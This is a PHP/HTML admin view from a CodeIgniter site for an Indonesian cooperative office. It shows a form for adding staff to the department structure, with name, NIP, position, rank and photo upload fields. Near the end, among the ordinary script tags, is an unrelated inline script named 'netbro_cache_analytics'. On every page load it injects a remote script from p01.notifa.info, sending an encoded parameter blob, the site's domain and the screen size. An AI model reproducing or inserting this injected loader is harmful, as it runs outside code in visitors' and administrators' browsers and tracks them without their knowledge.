<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="<?php echo base_url() ?>frontend/img/dinas.png">

    <title>Bidang Koperasi </title>
  
  <!-- Bootstrap 4.1.3-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/css/bootstrap.css">
  
  <!-- Bootstrap-extend-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/bootstrap-extend.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/font-awesome/css/font-awesome.min.css">

  <!-- Ionicons -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/Ionicons/css/ionicons.min.css">

  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/master_style.css">

  <!-- Minimal-art Admin Skins. Choose a skin from the css/skins
     folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/skins/_all-skins.css">

  <link href="<?php echo base_url('assets/datatables/css/dataTables.bootstrap.css')?>" rel="stylesheet">
  <link type="text/css" rel="stylesheet" href="<?=base_url();?>vendors/bootstrap-timepicker/css/bootstrap-timepicker.min.css" />
  <link href="<?php echo base_url()?>assets/date_picker_bootstrap/bootstrap-datetimepicker.min.css" rel="stylesheet" media="screen">

  <!-- google font -->
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

</head>
<body class="hold-transition skin-orange-light sidebar-mini">
  <div  id="notifications"><?php echo $this->session->flashdata('pesan2'); ?></div>
<div class="wrapper">

  <header class="main-header">
    <!-- Logo -->
    <a href="<?php echo base_url() ?>webbackend/C_dataOperator/homeAdmin" class="logo">
      <!-- mini logo for sidebar mini 50x50 pixels -->
      <span class="logo-mini"><img src="<?php echo base_url() ?>backend/images/minimal.png" alt=""></span>
      <!-- logo for regular state and mobile devices -->
      <span class="logo-lg"><b>Bidang Koperasi </b>Admin</span>
    </a>
    <!-- Header Navbar-->
    <nav class="navbar navbar-static-top">
      <!-- Sidebar toggle button-->
      <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
        <span class="sr-only">Toggle navigation</span>
      </a>

      <div class="navbar-custom-menu">
        <ul class="nav navbar-nav">
      <!-- User Account-->
          <li class="dropdown user user-menu">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="user-image rounded-circle" alt="User Image">
            </a>
            <ul class="dropdown-menu scale-up">
              <!-- User image -->
              <li class="user-header">
                <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="float-left rounded-circle" alt="User Image">

                <p>
                 <?=$this->session->userdata('namaLengkap')?>
                  <small class="mb-5"><?=$this->session->userdata('email')?></small>
                </p>
              </li>
              <!-- Menu Body -->
              <li class="user-body">
                
                <!-- /.row -->
              </li>
              <!-- Menu Footer-->
              <li class="user-footer">
               
                <div class="pull-right">
                  <a href="<?php echo base_url() ?>webbackend/C_dataOperator/logout" class="btn btn-block btn-danger"><i class="ion ion-power"></i> Log Out</a>
                </div>
        </li>
            </ul>
          </li>
         
          <!-- Control Sidebar Toggle Button -->
          <li>
            <a href="#" data-toggle="control-sidebar"><i class="fa fa-cog fa-spin"></i></a>
          </li>
        </ul>
      </div>
    </nav>
  </header>
  
  <!-- Left side column. contains the logo and sidebar -->
  <aside class="main-sidebar">
    <!-- sidebar -->
    <section class="sidebar">
      <!-- Sidebar user panel -->
      <div class="user-panel">
        <div class="image float-left">
          <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="rounded-circle" alt="User Image">
        </div>
        <div class="info float-left">
          <p><?=$this->session->userdata('namaLengkap')?></p>
          <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
        </div>
      
      </div>
      
      <!-- sidebar menu -->
      <ul class="sidebar-menu" data-widget="tree">
        
       <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataOperator/homeAdmin">
            <i class="fa fa-dashboard"></i>
            <span>Dashboard</span>
          </a>   
        </li>
      
        <li class="treeview">
          <a href="#">
             <i class="fa fa-table"></i>
            <span>Data koperasi</span>
            <span class="pull-right-container">
              <i class="fa fa-angle-left pull-right"></i>
            </span>
          </a>
          <ul class="treeview-menu">
            <li><a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatDataKoperasi">Data Koperasi</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatDaftarKoperasi">Data Daftar Koperasi</a></li>
          </ul>
        </li>

        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataOperator/lihatDataOperator">
            <i class="fa fa-th"></i>
            <span>Data Operator</span> 
          </a>
        </li>

        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatGrafik" target="_blank">
            <i class="fa fa-pie-chart"></i>
            <span>Grafik Koperasi</span>
          </a>
        </li>

        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataPengunduh/lihatPengunduh">
            <i class="fa fa-cloud-download"></i> 
            <span>Data Pengunduh</span>
          </a>
        </li>

        <li class="treeview">
          <a href="#">
             <i class="fa fa-laptop"></i>
            <span>Tampilan Depan</span>
            <span class="pull-right-container">
              <i class="fa fa-angle-left pull-right"></i>
            </span>
          </a>
          <ul class="treeview-menu">
            <li><a href="<?php echo base_url() ?>webbackend/C_pesanMasuk/lihatPesanMasuk">Pesan Masuk</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataBerita/lihatBerita">Berita</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataGaleri/lihatGaleri">Galeri</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_programKerja/lihatProgramKerja">Program Kerja</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_agendaKerja/lihatAgendaKerja">Agenda Kerja</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_strukturBidang/lihatStruktur">Struktur Bidang</a></li>
          </ul>
        </li>   
        
      </ul>
    </section>
    <!-- /.sidebar -->
    <div class="sidebar-footer">
   
    <!-- item-->
    <a href="<?php echo base_url() ?>webbackend/C_pesanMasuk/lihatPesanMasuk" class="link" data-toggle="tooltip" title="" data-original-title="Email"><i class="fa fa-envelope"></i></a>
    <!-- item-->
    <a href="<?php echo base_url() ?>webbackend/C_dataOperator/logout" class="link" data-toggle="tooltip" title="" data-original-title="Logout"><i class="fa fa-power-off"></i></a>
  </div>
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Form Input Struktur Bidang Kelembagaan Koperasi
      </h1>
     
    </section>

    <!-- Main content -->
    <section class="content">
     
     <!-- Basic Forms -->
      <div class="box box-default">
        
        <!-- /.box-header -->
        <div class="box-body">

          <form method="POST" action="<?php echo base_url().'webbackend/C_strukturBidang/prosesInputStruktur'?>" name="inputStruktur" enctype="multipart/form-data">

          <div class="row">
            <div class="col-6">

          <div class="form-group">
            <h5>Nama Lengkap</h5>
            <div class="controls">
              <input type="text" name="namaPegawai" class="form-control" value="<?php echo set_value('namaPegawai') ?>" required> 
              <?php echo form_error('namaPegawai'); ?></div>
          </div>

          <div class="form-group">
            <h5>NIP</h5>
            <div class="controls">
              <input type="number" name="nip" class="form-control" value="<?php echo set_value('nip') ?>" required> 
              <?php echo form_error('nip'); ?></div>
          </div>

          <div class="form-group">
            <h5>Jabatan </h5>
            <div class="controls">
              <select name="jabatan" required class="form-control">
                <option><?php echo set_value('jabatan') ?></option>
                <option>Ka.Bidang Kelembagaan Koperasi</option>
                <option>Kasi Badan Hukum dan Organisasi Koperasi</option>
                <option>Kasi Tata Laksana Koperasi</option>
                <option>Kasi Penyuluhan Perkoperasi dan Keanggotaan</option>
              </select>
              <?php echo form_error('jabatan'); ?>
            </div>
          </div>

          <div class="form-group">
            <h5>Bagian</h5>
            <div class="controls">
              <select name="bagian" required class="form-control">
                <option><?php echo set_value('bagian') ?></option>
                <option>Pembina Tk.I</option>
                <option>Pembina</option>
              </select>
              <?php echo form_error('bagian'); ?>
            </div>
          </div>

           <div class="form-group">
            <h5>Foto</h5>
            <div>
                <input class="form-control" type="file" name="userfile" required>
                <span><i>Format file : JPG/PNG/JPEG/GIF | Maksimal Upload : 10 Mb</i></span>
            </div>
          </div>

          <div class="text-xs-right">
            <!-- <button type="submit" class="btn btn-info">Submit</button> -->
            <fieldset>
             <?php echo anchor('webbackend/C_strukturBidang/lihatStruktur','K E M B A L I',array('class'=>'btn btn-round btn-info' ));?>
          
                <input type="submit" name="submit" class="btn btn-round btn-success" value="S I M P A N"/>
          </fieldset>
          </div>
       
            </div>
            <!-- /.col -->

          </div>
          <!-- /.row -->

           </form>

        </div>
        <!-- /.box-body -->
      </div>
      <!-- /.box -->
      
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
  
  <footer class="main-footer">
    <div class="pull-right d-none d-sm-inline-block">
    
    </div>Copyright &copy; Farhan Sutrisno 2018 All Rights Reserved.
  </footer>


  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li class="nav-item"><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
      <li class="nav-item"><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-cog fa-spin"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Recent Activity</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-birthday-cake bg-red"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Admin Birthday</h4>

                <p>Will be July 24th</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-yellow"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Jhone Updated His Profile</h4>

                <p>New Email : jhone_doe@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Disha Joined Mailing List</h4>

                <p>disha@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-file-code-o bg-green"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Code Change</h4>

                <p>Execution time 15 Days</p>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

        <h3 class="control-sidebar-heading">Tasks Progress</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Web Design
                <span class="label label-danger pull-right">40%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-danger" style="width: 40%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Update Data
                <span class="label label-success pull-right">75%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-success" style="width: 75%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Order Process
                <span class="label label-warning pull-right">89%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-warning" style="width: 89%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Development 
                <span class="label label-primary pull-right">72%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-primary" style="width: 72%"></div>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

      </div>
      <!-- /.tab-pane -->
      <!-- Stats tab content -->
      <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
        <form method="post">
          <h3 class="control-sidebar-heading">General Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="report_panel" class="chk-col-grey" >
      <label for="report_panel" class="control-sidebar-subheading ">Report panel usage</label>

            <p>
              general settings information
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="allow_mail" class="chk-col-grey" >
      <label for="allow_mail" class="control-sidebar-subheading ">Mail redirect</label>

            <p>
              Other sets of options are available
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="expose_author" class="chk-col-grey" >
      <label for="expose_author" class="control-sidebar-subheading ">Expose author name</label>

            <p>
              Allow the user to show his name in blog posts
            </p>
          </div>
          <!-- /.form-group -->

          <h3 class="control-sidebar-heading">Chat Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="show_me_online" class="chk-col-grey" >
      <label for="show_me_online" class="control-sidebar-subheading ">Show me as online</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="off_notifications" class="chk-col-grey" >
      <label for="off_notifications" class="control-sidebar-subheading ">Turn off notifications</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">              
              <a href="javascript:void(0)" class="text-red margin-r-5"><i class="fa fa-trash-o"></i></a>
              Delete chat history
            </label>
          </div>
          <!-- /.form-group -->
        </form>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  
  <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
</div>
<!-- ./wrapper -->

  <!-- jQuery 3 -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-3.3.1/jquery-3.3.1.js"></script>
  
  <!-- popper -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/popper/dist/popper.min.js"></script>
  
  <!-- Bootstrap 4.1.3-->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/js/bootstrap.min.js"></script>
  
  <!-- SlimScroll -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
  
  <!-- FastClick -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/fastclick/lib/fastclick.js"></script>
  
  <!-- Minimal-art Admin App -->
  <script src="<?php echo base_url() ?>backend/js/template.js"></script>
  
  <!-- Minimal-art Admin for demo purposes -->
  <script src="<?php echo base_url() ?>backend/js/demo.js"></script>
  
  <!-- Form validator JavaScript -->
    <script src="<?php echo base_url() ?>backend/js/pages/validation.js"></script>
    <script>
    ! function(window, document, $) {
  "use strict";
    $("input,select,textarea").not("[type=submit]").jqBootstrapValidation();
  }(window, document, jQuery); // End of use strict
    </script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2awh6yNMRYGxaFDh9gX9buTIJwg9uWJxfTn%2b3G5ywSkfTSda5VMPv8ASrZ8xGia7TFIUV9290nHi6dr9jAjGUfyH5gQste5Ne4RRWS8aQpHmuaI3XCH%2bUDWtbogIdRakn4NzGX3r%2ff2%2bF31xRXqAeAMC8noHx3IxN%2feda9c%2f05HrO%2f8tjxPpaEw14163W5iBe5fcRAJZrTH%2buvu3QlSCAM6rBjitQf517yXOdSkET6BzF3QZkBY7hx5mXoa1gP2ztZ5ObHOhawlB0ac1LN91Fg4uIpUbK6%2f3Zs5osUngzlnl%2byJPcOp2eclzPCpSvnvTUvp8ArKACYnU1OlTRmuAhNfRxH96rNiv9hiDE40I4kwdo7xZSEz4CNkehZRAcVU28rteOgqaCHPDCLqoNUkP5A0M3YtfABmuaw0vunbeJdnI52T1gxHaEp9fMyIRdW2ZVbgvhDk6n1RHefKhZt7i5jGxUvWWyU2z6ScpZrgQRmfAd6oBow9TLRUID2i9me2W08Zwe3DYHgJZ3im9FoOMBXQj7WEptpYxD" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<!-- script buat date picker-->
  <script type="text/javascript" src="<?php echo base_url()?>assets/date_picker_bootstrap/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
    <script type="text/javascript">
     $('.datepicker').datetimepicker({
        language:  'id',
        weekStart: 1,
        todayBtn:  1,
        autoclose: 1,
        todayHighlight: 1,
        startView: 2,
        minView: 2,
        forceParse: 0
        });
    </script>

</body>

</html>
